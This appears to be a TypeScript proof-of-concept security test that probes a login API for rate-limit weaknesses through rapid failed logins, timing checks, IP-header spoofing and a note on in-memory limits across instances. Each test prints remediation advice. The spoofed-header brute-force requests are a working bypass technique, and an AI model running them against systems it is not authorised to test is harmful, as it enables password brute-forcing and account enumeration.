/**
 * PoC: Distributed Rate Limit Bypass
 * 
 * VULNERABILITY: Rate limiting uses in-memory Map, not shared storage.
 * In multi-instance deployments, attackers can bypass by targeting different instances.
 * 
 * IMPACT: 
 * - Brute force attacks possible
 * - Account enumeration
 * - DoS amplification
 * 
 * Run: npx ts-node security-tests/exploit-rate-limit-bypass.ts
 */

import axios, { AxiosResponse } from 'axios';

// ============================================
// CONFIGURATION
// ============================================
const API_BASE = 'https://api.security-test.site/api/v1';
const TIMEOUT = 10000;

// ============================================
// HELPER FUNCTIONS
// ============================================
function isHtmlResponse(response: AxiosResponse): boolean {
  const contentType = response.headers['content-type'] || '';
  const data = typeof response.data === 'string' ? response.data : '';
  return contentType.includes('text/html') || data.includes('<!doctype') || data.includes('<html');
}

function isCloudflareBlocked(response: AxiosResponse): boolean {
  const data = typeof response.data === 'string' ? response.data : '';
  return data.includes('cloudflare') || data.includes('challenge-platform');
}

function isValidApiResponse(response: AxiosResponse): boolean {
  const contentType = response.headers['content-type'] || '';
  return contentType.includes('application/json');
}

interface AttackResult {
  requestNumber: number;
  status: number;
  blocked: boolean;
  responseTime: number;
  success?: boolean;
  isHtml?: boolean;
  message?: string;
}

async function singleLoginAttempt(
  email: string, 
  password: string, 
  requestNum: number
): Promise<AttackResult> {
  const start = Date.now();
  
  try {
    const response = await axios.post(
      `${API_BASE}/auth/login`,
      { email, password },
      {
        headers: {
          'Content-Type': 'application/json',
          'X-Forwarded-For': `192.168.1.${requestNum % 255}`, // Rotate IPs if proxy trusted
        },
        timeout: 10000,
        validateStatus: () => true
      }
    );
    
    return {
      requestNumber: requestNum,
      status: response.status,
      blocked: response.status === 429,
      responseTime: Date.now() - start
    };
  } catch (error: any) {
    return {
      requestNumber: requestNum,
      status: error.response?.status || 0,
      blocked: error.response?.status === 429,
      responseTime: Date.now() - start
    };
  }
}

async function testRateLimitEnforcement() {
  console.log('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
  console.log('â•‘     TEST #1: Rate Limit Enforcement Check                â•‘');
  console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
  
  const email = 'test@example.com';
  const password = 'wrong_password';
  const MAX_ATTEMPTS = 20;
  
  console.log(`[1] Sending ${MAX_ATTEMPTS} rapid login attempts...`);
  console.log(`    Target email: ${email}`);
  console.log(`    (Using wrong password to trigger failures)\n`);
  
  const results: AttackResult[] = [];
  
  for (let i = 1; i <= MAX_ATTEMPTS; i++) {
    const result = await singleLoginAttempt(email, password, i);
    results.push(result);
    
    const status = result.blocked ? 'ğŸš« BLOCKED' : (result.status === 401 ? 'âŒ Failed' : `âš ï¸ ${result.status}`);
    console.log(`    Request ${i.toString().padStart(2)}: ${status} (${result.responseTime}ms)`);
    
    // Small delay to not overwhelm
    await new Promise(resolve => setTimeout(resolve, 100));
  }
  
  const blocked = results.filter(r => r.blocked);
  const notBlocked = results.filter(r => !r.blocked);
  
  // Check if we're getting HTML responses (not hitting real API)
  const htmlResponses = results.filter(r => r.isHtml);
  
  console.log('\n[2] Analysis:');
  console.log(`    Total requests:    ${results.length}`);
  console.log(`    Blocked (429):     ${blocked.length}`);
  console.log(`    Not blocked:       ${notBlocked.length}`);
  console.log(`    HTML responses:    ${htmlResponses.length}`);
  
  if (htmlResponses.length > 0) {
    console.log('\n    âš ï¸ INCONCLUSIVE: Received HTML responses instead of API');
    console.log('    This means requests are not reaching the backend API.');
    console.log('    Possible causes:');
    console.log('    - Frontend SPA is catching all routes');
    console.log('    - API is behind different domain/path');
    console.log('    - Cloudflare/WAF is blocking before API');
    return false;
  }
  
  if (blocked.length === 0) {
    console.log('\n    ğŸš¨ WARNING: No requests were rate-limited!');
    console.log('    This could indicate:');
    console.log('    - Rate limiting is disabled');
    console.log('    - Threshold is too high');
    console.log('    - Testing from whitelisted IP');
  } else {
    const firstBlockAt = blocked[0].requestNumber;
    console.log(`\n    âœ… Rate limiting kicked in at request #${firstBlockAt}`);
    
    if (firstBlockAt > 10) {
      console.log('    âš ï¸ Threshold might be too high for security');
    }
  }
  
  return blocked.length > 0;
}

async function testProgressiveDelay() {
  console.log('\n\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
  console.log('â•‘     TEST #2: Progressive Delay Detection                 â•‘');
  console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
  
  const email = 'delay-test@example.com';
  const password = 'wrong';
  
  console.log('[1] Testing if progressive delays are implemented...\n');
  
  const timings: number[] = [];
  
  for (let i = 1; i <= 6; i++) {
    const start = Date.now();
    await singleLoginAttempt(email, password, i);
    const elapsed = Date.now() - start;
    timings.push(elapsed);
    console.log(`    Attempt ${i}: ${elapsed}ms`);
  }
  
  // Check if delays are increasing
  let increasing = true;
  for (let i = 1; i < timings.length; i++) {
    if (timings[i] < timings[i-1] - 100) { // Allow 100ms variance
      increasing = false;
      break;
    }
  }
  
  if (increasing && timings[timings.length-1] > timings[0] + 1000) {
    console.log('\n    âœ… Progressive delay detected!');
    console.log('    Good protection against rapid brute force.');
  } else {
    console.log('\n    âš ï¸ No significant progressive delay detected');
    console.log('    Consider implementing exponential backoff.');
  }
}

async function testIPRotationBypass() {
  console.log('\n\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
  console.log('â•‘     TEST #3: IP Rotation Bypass (X-Forwarded-For)        â•‘');
  console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
  
  console.log('[1] Testing if X-Forwarded-For header bypasses rate limit...\n');
  
  const email = 'rotation-test@example.com';
  const password = 'wrong';
  
  // First, exhaust rate limit from "real" IP
  console.log('    Phase 1: Exhaust rate limit...');
  for (let i = 0; i < 10; i++) {
    await singleLoginAttempt(email, password, i);
  }
  
  // Then try with spoofed X-Forwarded-For
  console.log('    Phase 2: Try with spoofed IP headers...');
  
  const spoofedIPs = [
    '10.0.0.1',
    '172.16.0.1',
    '192.168.0.1',
    '1.2.3.4',
    '8.8.8.8'
  ];
  
  let bypassed = false;
  
  for (const ip of spoofedIPs) {
    try {
      const response = await axios.post(
        `${API_BASE}/auth/login`,
        { email, password },
        {
          headers: {
            'Content-Type': 'application/json',
            'X-Forwarded-For': ip,
            'X-Real-IP': ip,
            'CF-Connecting-IP': ip, // Cloudflare
            'True-Client-IP': ip,   // Akamai
          },
          timeout: 5000,
          validateStatus: () => true
        }
      );
      
      if (response.status !== 429) {
        console.log(`    ğŸš¨ IP ${ip}: Not rate limited! (${response.status})`);
        bypassed = true;
      } else {
        console.log(`    âœ… IP ${ip}: Still blocked (429)`);
      }
    } catch (error: any) {
      console.log(`    IP ${ip}: Error - ${error.message}`);
    }
  }
  
  if (bypassed) {
    console.log('\n    ğŸš¨ VULNERABILITY: X-Forwarded-For bypass works!');
    console.log('    Server trusts client-provided IP headers.');
    console.log('\n    REMEDIATION:');
    console.log('    - Only trust X-Forwarded-For behind known proxies');
    console.log('    - Validate trust_proxy configuration');
  } else {
    console.log('\n    âœ… X-Forwarded-For spoofing does not bypass rate limit');
  }
  
  return bypassed;
}

async function testDistributedBypass() {
  console.log('\n\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
  console.log('â•‘     TEST #4: Distributed Instance Bypass Theory          â•‘');
  console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
  
  console.log('[1] In-Memory Rate Limiting Weakness:');
  console.log('');
  console.log('    Current implementation uses:');
  console.log('    const failedLogins = new Map<string, FailedLoginRecord>();');
  console.log('');
  console.log('    Problem: Each server instance has its own Map!');
  console.log('');
  console.log('    Attack scenario with 3 instances behind load balancer:');
  console.log('');
  console.log('    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”');
  console.log('    â”‚   Attacker  â”‚');
  console.log('    â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜');
  console.log('           â”‚');
  console.log('    â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”');
  console.log('    â”‚Load Balancerâ”‚');
  console.log('    â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜');
  console.log('      â”Œâ”€â”€â”€â”€â”¼â”€â”€â”€â”€â”');
  console.log('      â–¼    â–¼    â–¼');
  console.log('    â”Œâ”€â”€â”€â”â”Œâ”€â”€â”€â”â”Œâ”€â”€â”€â”');
  console.log('    â”‚ A â”‚â”‚ B â”‚â”‚ C â”‚  Each has own Map()');
  console.log('    â””â”€â”€â”€â”˜â””â”€â”€â”€â”˜â””â”€â”€â”€â”˜');
  console.log('');
  console.log('    Attacker sends:');
  console.log('    - 5 requests â†’ Instance A (not blocked)');
  console.log('    - 5 requests â†’ Instance B (not blocked)');
  console.log('    - 5 requests â†’ Instance C (not blocked)');
  console.log('    = 15 attempts before any blocking!');
  console.log('');
  console.log('    With round-robin: 3x the allowed attempts');
  console.log('    With 10 instances: 10x the allowed attempts!');
  console.log('');
  
  console.log('[2] Detection:');
  console.log('    Cannot test remotely without multi-instance access.');
  console.log('    Check if Redis/shared storage is used for rate limiting.\n');
  
  console.log('[3] REMEDIATION:');
  console.log('    - Use Redis for distributed rate limiting');
  console.log('    - Example: express-rate-limit with redis-store');
  console.log('    - Or use rate-limiter-flexible with Redis');
}

async function main() {
  console.log('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
  console.log('â•‘     RATE LIMIT BYPASS TEST SUITE                             â•‘');
  console.log('â•‘     Target: https://security-test.site                       â•‘');
  console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
  
  console.log('âš ï¸  This is for authorized security testing only!\n\n');
  
  const hasRateLimit = await testRateLimitEnforcement();
  await testProgressiveDelay();
  const ipBypass = await testIPRotationBypass();
  await testDistributedBypass();
  
  console.log('\n\n' + '='.repeat(60));
  console.log('SUMMARY:');
  console.log('='.repeat(60));
  
  if (!hasRateLimit) {
    console.log('ğŸš¨ CRITICAL: Rate limiting not enforced!');
  }
  
  if (ipBypass) {
    console.log('ğŸš¨ HIGH: IP header spoofing bypasses rate limit');
  }
  
  console.log('âš ï¸ MEDIUM: In-memory rate limiting vulnerable in multi-instance');
  console.log('');
  console.log('Recommendations:');
  console.log('1. Use Redis for distributed rate limiting');
  console.log('2. Lower thresholds (5 failed logins / 15 min)');
  console.log('3. Add CAPTCHA after 3 failed attempts');
  console.log('4. Implement account lockout notification');
}

main().catch(console.error);
